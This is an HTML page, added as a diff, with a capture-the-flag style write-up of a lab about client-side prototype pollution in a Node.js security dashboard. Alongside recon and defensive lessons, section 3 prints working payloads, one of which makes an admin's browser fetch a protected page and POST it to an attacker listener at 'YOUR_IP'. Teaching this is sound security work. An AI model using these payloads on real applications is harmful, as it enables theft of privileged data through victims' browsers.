@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://challenges.cloudflare.com; style-src 'self' https://cdnjs.cloudflare.com; font-src 'self' https://cdnjs.cloudflare.com; img-src 'self' data:; connect-src 'self' https://formspree.io https://hacker-news.firebaseio.com; frame-src https://challenges.cloudflare.com; form-action 'self' https://formspree.io; base-uri 'self'; object-src 'none'; upgrade-insecure-requests">
+    <meta name="referrer" content="strict-origin-when-cross-origin">
+    <title>Pollution Write-up (Hack Smarter) | White Rabbit Security</title>
+    <meta name="description" content="A walkthrough of the Hack Smarter Pollution web lab: a client-side prototype pollution gadget in a Node.js SOC app chained with a mail feature to read a protected page.">
+    <meta name="theme-color" content="#060b13">
+    <link rel="canonical" href="https://whiterabbitsecurity.app/learn/writeups/pollution/">
+    <link rel="icon" href="/img/favicon-32.png" type="image/png" sizes="32x32">
+    <link rel="icon" href="/img/favicon-192.png" type="image/png" sizes="192x192">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <meta property="og:site_name" content="White Rabbit Security">
+    <meta property="og:locale" content="en_US">
+    <meta property="og:title" content="Pollution Write-up (Hack Smarter) | White Rabbit Security">
+    <meta property="og:description" content="A walkthrough of the Hack Smarter Pollution web lab: a client-side prototype pollution gadget in a Node.js SOC app chained with a mail feature to read a protected page.">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://whiterabbitsecurity.app/learn/writeups/pollution/">
+    <meta property="og:image" content="https://whiterabbitsecurity.app/wrs.jpg">
+    <meta property="og:image:alt" content="White Rabbit Security crest">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Pollution Write-up (Hack Smarter) | White Rabbit Security">
+    <meta name="twitter:description" content="A walkthrough of the Hack Smarter Pollution web lab: a client-side prototype pollution gadget chained with a mail feature to read a protected page.">
+    <meta name="twitter:image" content="https://whiterabbitsecurity.app/wrs.jpg">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer">
+    <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+    <a class="skip-link" href="#main">Skip to content</a>
+    <nav>
+        <a href="/" class="nav-logo">
+            <img src="/img/logo-mark.png" alt="White Rabbit Security" width="40" height="40">
+        </a>
+        <div class="nav-links">
+            <a href="/">Home</a>
+            <a href="/services/">Services</a>
+            <a href="/about/">About</a>
+            <a href="/news/">News</a>
+            <a href="/contact/">Contact</a>
+            <a href="/learn/" class="active" aria-current="page">Learn</a>
+        </div>
+    </nav>
+
+    <main id="main" tabindex="-1">
+        <header class="hero">
+            <h1>Pollution</h1>
+            <p>Hack Smarter &middot; Web &middot; Easy. A Node.js SOC console parses URL fragments into a settings object without guarding its prototype. That one shortcut becomes a client-side code-execution gadget &mdash; and a mail feature delivers it to an admin.</p>
+            <p class="lede">A Hack Smarter lab, shared with permission. The provided test credentials and the flag value are redacted &mdash; the point is the vulnerability, not the answer.</p>
+        </header>
+
+        <section class="services" aria-labelledby="po-recon">
+            <h2 id="po-recon" class="section-title">1. <span class="highlight">Recon</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>Scope is a single SOC web app. The scan shows SSH and a <strong>Node.js / Express</strong> app on 3000. The brief hands over low-privilege test credentials, which land you on a SOC dashboard with a log-search box and a &ldquo;webmail&rdquo; feature that sends messages to an admin.</p>
+                <pre class="code-block"><code>nmap -p- -sC -sV -oA scans/all TARGET   # 22/ssh, 3000/http (Express)</code></pre>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="po-source">
+            <h2 id="po-source" class="section-title">2. Read the Client <span class="highlight">Code</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>The search box reflects a parameter into the page, but only client-side &mdash; not obviously useful. The interesting part is how the page handles the URL fragment. A <code>syncState</code> function splits <code>location.hash</code> into <code>key=value</code> pairs and walks a dotted key path, assigning into a settings object:</p>
+                <pre class="code-block"><code>// paraphrased from the page source
+const path = key.split('.');
+let current = target;
+for (let i = 0; i &lt; path.length; i++) {
+  if (i === path.length - 1) current[part] = value;
+  else current = current[part] = current[part] || {};
+}
+// later:
+if (options.renderCallback) results.appendChild(
+  document.createRange().createContextualFragment(options.renderCallback));</code></pre>
+                <p>Walking a user-controlled key path with no check for <code>__proto__</code> is textbook <strong>prototype pollution</strong>. And the render path trusts an <code>options.renderCallback</code> that pollution can define &mdash; a ready-made gadget that injects HTML.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="po-exploit">
+            <h2 id="po-exploit" class="section-title">3. Pollute, then <span class="highlight">Exfiltrate</span></h2>
+            <div class="service-card prose-card sheet">
+                <p>Setting <code>__proto__.renderCallback</code> in the fragment makes every settings object inherit an attacker-defined render payload, which the page then turns into live DOM &mdash; client-side code execution.</p>
+                <pre class="code-block"><code>http://TARGET:3000/dashboard#__proto__.renderCallback=&lt;img src=x onerror="/* your JS */"&gt;</code></pre>
+                <p>A protected page (<code>/incident-response</code>) returns 403 to us but is readable by the admin. So deliver the gadget <em>to the admin</em> through the mail feature: the body carries a dashboard link with a payload that fetches the protected page and posts it back to your listener. When the admin opens it, their browser reads the page and exfiltrates it.</p>
+                <pre class="code-block"><code># mail body (admin's browser runs it)
+http://TARGET:3000/dashboard#__proto__.renderCallback=&lt;script&gt;
+fetch('/incident-response').then(r=&gt;r.text())
+.then(d=&gt;fetch('http://YOUR_IP:8000/',{method:'POST',body:d}))&lt;/script&gt;</code></pre>
+                <p>The flag is in the exfiltrated contents of the protected page.</p>
+            </div>
+        </section>
+
+        <section class="services" aria-labelledby="po-lessons">
+            <h2 id="po-lessons" class="section-title">What To <span class="highlight">Take Away</span></h2>
+            <div class="service-card prose-card">
+                <ul class="spec-list">
+                    <li><i class="fa-solid fa-sitemap" aria-hidden="true"></i> Walking a user-controlled key path must reject <code>__proto__</code>, <code>constructor</code> and <code>prototype</code>, or use a null-prototype object / <code>Map</code>.</li>
+                    <li><i class="fa-solid fa-inject" aria-hidden="true"></i> A pollution gadget needs a sink. Here an inherited <code>renderCallback</code> fed straight into the DOM was the sink.</li>
+                    <li><i class="fa-solid fa-envelope-open-text" aria-hidden="true"></i> A feature that sends attacker content to a privileged user turns a self-only client bug into an admin-context attack.</li>
+                    <li><i class="fa-solid fa-code" aria-hidden="true"></i> Read the client JavaScript. The whole vulnerability was visible in the page source.</li>
+                </ul>
+            </div>
+        </section>
+
+        <section class="services">
+            <div class="uplink">
+                <div class="uplink-icon"><i class="fa-solid fa-bug" aria-hidden="true"></i></div>
+                <h2>About the <span class="highlight">Lab</span></h2>
+                <p>Pollution is a Hack Smarter web lab, published with the creator's permission. Hack Smarter runs realistic, engagement-style labs and training.</p>
+                <div class="hero-buttons">
+                    <a href="https://hacksmarter.org" target="_blank" rel="noopener noreferrer" class="btn btn-primary">Visit Hack Smarter</a>
+                    <a href="https://portswigger.net/web-security/prototype-pollution" target="_blank" rel="noopener noreferrer" class="btn btn-outline">Prototype pollution</a>
+                </div>
+            </div>
+        </section>
+        <section class="services">
+            <div class="service-actions"><a href="/learn/writeups/" class="btn btn-outline btn-sm">Back to Write-ups</a></div>
+        </section>
+    </main>
+    <footer class="site-footer">
+        <p>&copy; 2026 White Rabbit Security</p>
+        <p>Client information shared with us is treated as confidential. Do not send passwords or sensitive data through this site.</p>
+        <p class="footer-links"><a href="/contact/">Contact</a> <a href="/privacy/">Privacy</a> <a href="/.well-known/security.txt">security.txt</a></p>
+    </footer>
+</body>
+</html>
